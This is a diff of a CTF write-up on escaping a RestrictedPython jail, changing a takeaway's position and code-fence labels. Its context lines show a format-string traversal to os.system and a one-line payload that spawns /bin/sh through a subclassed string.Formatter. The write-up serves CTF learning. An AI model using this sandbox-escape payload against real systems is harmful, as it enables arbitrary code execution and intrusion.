@@ -15,6 +15,7 @@ Description:
 
 ## Takeaways
 
+* String format vulnerability to RCE. We can execute arbitrary code on top of leaking stuff with the string format.
 * `\r` instead of `\n` in `input()` to fake a new line in the python interpreter. This will reset the scope when chaining multiple expressions in the same line. For example the following are equivalent:
   ```python
   class Bazz: pass; x=1;\r y=1
@@ -24,7 +25,6 @@ Description:
     x=1
   y=1
   ```
-* String format vulnerability to RCE. We can execute arbitrary code on top of leaking stuff with the string format.
 
 ## Solution
 
@@ -236,7 +236,7 @@ FORBIDDEN_FUNC_NAMES = frozenset([
 
 Let's enable `dir` and see what globals we actually have available:
 
-```log
+```python
 nikos@ctf-box:~$ python main.py
 Well, well well. Let's see just how poisonous you are..
 > print(dir())
@@ -266,7 +266,7 @@ So where should we look at? Since the challenges uses the specific `RestrictedPy
 
 In our jail, we have access to the `string` module as shown above and let's check if we can acess the `Formatter` class:
 
-```log
+```python
 nikos@ctf-box:~$ python main.py
 Well, well well. Let's see just how poisonous you are..
 > print(string.Formatter)
@@ -275,7 +275,7 @@ Well, well well. Let's see just how poisonous you are..
 
 So, we actually have access! Let's try a couple string formats:
 
-```log
+```python
 nikos@ctf-box:~$ python main.py
 Well, well well. Let's see just how poisonous you are..
 > print('{0.x}'.format([]))
@@ -326,7 +326,7 @@ In [2]: random.Random.__init__.__globals__['_os'].system
 Out[2]: <function posix.system(command)>
 ```
 
-```log
+```python
 nikos@ctf-box:~$ python main.py
 Well, well well. Let's see just how poisonous you are..
 > print(string.Formatter().format("{0.Random.__init__.__globals__[_os].system}", random))
@@ -424,7 +424,7 @@ And success! We have a shell locally in our interpreter!
 
 The final thing is to convert our payload to a one liner. This is because our payload is read via `input()` and fed to `exec()`. We can use multiple statements, e.g. chained via `;`, but the payload has to be a single line.
 
-```log
+```python
 nikos@ctf-box:~$ python main.py
 Well, well well. Let's see just how poisonous you are..
 > class Baz(string.Formatter): pass; get_field = (lambda self, field_name, args, kwargs: super().get_field(field_name, args, kwargs)[0](('/bin/sh')), ''); Baz().format("{0.Random.__init__.__globals__[_os].system}", random)
@@ -465,7 +465,7 @@ Aha! As we can see, the scoping changes because we are inside the `Baz` class. W
 
 So, let's adapt once again our payload:
 
-```log
+```python
 nikos@ctf-box:~$ echo -e 'class Baz(string.Formatter): pass; get_field = lambda self, field_name, args, kwargs: (super().get_field(field_name, args, kwargs)[0]("/bin/sh"), ""); \rBaz().format("{0.Random.__init__.__globals__[_os].system}", random)' | python main.py
 Well, well well. Let's see just how poisonous you are..
 Traceback (most recent call last):
